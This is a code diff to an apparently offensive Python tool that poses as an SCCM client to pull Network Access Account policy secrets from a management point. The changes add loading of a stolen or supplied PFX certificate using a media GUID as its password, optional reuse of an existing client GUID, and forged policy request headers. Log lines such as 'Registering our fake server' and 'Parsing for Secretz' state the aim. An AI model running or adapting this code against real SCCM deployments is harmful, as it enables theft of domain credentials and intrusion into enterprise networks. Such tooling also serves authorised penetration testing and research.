@@ -11,6 +11,7 @@ from pyasn1.codec.der.decoder import decode
 from pyasn1_modules import rfc5652
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.serialization import PublicFormat
+from cryptography.hazmat.primitives.serialization import pkcs12
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -39,7 +40,7 @@ now = datetime.datetime.utcnow()
 registrationRequestWrapper = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
 registrationRequest = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}"><AgentInformation AgentIdentity="CCMSetup.exe" AgentVersion="5.00.8325.0000" AgentType="0" /><Certificates><Encryption Encoding="HexBinary" KeyType="1">{encryption}</Encryption><Signing Encoding="HexBinary" KeyType="1">{signature}</Signing></Certificates><DiscoveryProperties><Property Name="Netbios Name" Value="{client}" /><Property Name="FQ Name" Value="{clientfqdn}" /><Property Name="Locale ID" Value="2057" /><Property Name="InternetFlag" Value="0" /></DiscoveryProperties></Data>"""
 msgHeader = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
-msgHeaderPolicy = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
+msgHeaderPolicy = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>{replyTo}</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
 policyBody = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
 reportBody = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><ReportBody /></Report>"""
 
@@ -149,13 +150,16 @@ class CryptoTools:
 
 class SCCMTools():
 
-    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password, logs_dir):
-        self._server = target_sccm
+    def __init__(self, mp, device_name="", device_fqdn="", machine_username=None, machine_password=None, client_guid=None, media_guid=None, certificate=None, logs_dir=None):
+        self._server = mp
         self._serverURI = f"http://{self._server}"
-        self._target_name = target_name
-        self._target_fqdn = target_fqdn
-        self.target_username = target_username
-        self.target_password = target_password
+        self.device_name = device_name
+        self.device_fqdn = device_fqdn
+        self.machine_username = machine_username
+        self.machine_password = machine_password
+        self.client_guid = client_guid
+        self.media_guid = media_guid
+        self.cert = certificate
         self.logs_dir = logs_dir
 
     def sendCCMPostRequest(self, data, auth=False, username="", password=""):
@@ -258,7 +262,8 @@ class SCCMTools():
           clientIDsignature=clientIDSignature, 
           payloadsignature=payloadSignature, 
           clientid=uuid, 
-          date=now.strftime(dateFormat1)
+          date=now.strftime(dateFormat1),
+          replyTo="direct:{client}:SccmMessaging"
         )
 
         data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')
@@ -267,6 +272,7 @@ class SCCMTools():
         result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
         #r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
         return [result.group(1)]
+    
 
     def parseEncryptedPolicy(self, result):
         # Man.. asn1 suxx!
@@ -352,25 +358,47 @@ class SCCMTools():
             print(f"An error occurred while parsing the XML: {e}")
         except Exception as e:
             print(e)
-    
+
+
+    def prepareCertificate(self):
+        try:
+            cert_bytes = bytes.fromhex(self.cert)
+            password = f"{{{self.media_guid.strip('{}')}}}"[:31]
+
+            self.key, self.cert, additional_certificates = pkcs12.load_key_and_certificates(
+                cert_bytes, password=password.encode('utf-8'), backend=default_backend()
+            )
+        except ValueError as e:
+            print("Error loading the PFX certificate:", e)
+
+
+    def string_to_byte_array(self, hex_string):
+        return bytes(int(hex_string[i:i+2], 16) for i in range(0, len(hex_string), 2))
+         
     
     def sccmwtf_run(self):
 
-        logger.debug("[*] Creating certificate for our fake server...")
+        if not self.cert:
+            logger.debug("[*] Creating certificate for our fake server...")
+            self.createCertificate(True)
 
-        self.createCertificate(True)
+            logger.debug("[*] Registering our fake server...")
+            uuid = self.sendRegistration(self.device_name, self.device_fqdn, self.machine_username, self.machine_password)
+
+            logger.debug(f"[*] Done.. our ID is {uuid}")
+
+            # If too quick, SCCM requests fail (DB error, jank!)
+            logger.info(f"[*] Waiting 10 seconds for database to update.")
+            time.sleep(10)
         
-        logger.debug("[*] Registering our fake server...")
-        uuid = self.sendRegistration(self._target_name, self._target_fqdn, self.target_username, self.target_password)
+        else:
+            logger.debug("[*] Using supplied certificate")
+            self.prepareCertificate()
 
-        logger.debug(f"[*] Done.. our ID is {uuid}")
-
-        # If too quick, SCCM requests fail (DB error, jank!)
-        logger.info(f"[*] Waiting 10 seconds for database to update.")
-        time.sleep(10)
+            uuid = self.client_guid.upper()
 
         logger.debug("[*] Requesting NAAPolicy.. 2 secs")
-        urls = self.sendPolicyRequest(self._target_name, self._target_fqdn, uuid, self._target_name, self._target_fqdn, uuid)
+        urls = self.sendPolicyRequest(self.device_name, self.device_fqdn, uuid, self.device_name, self.device_fqdn, uuid)
 
         logger.debug("[*] Parsing for Secretz...")
 
@@ -391,6 +419,3 @@ class SCCMTools():
                    logger.info(f"[-] Something went wrong.")
         
         self.cleanupCertifcate(True)
-
-
-
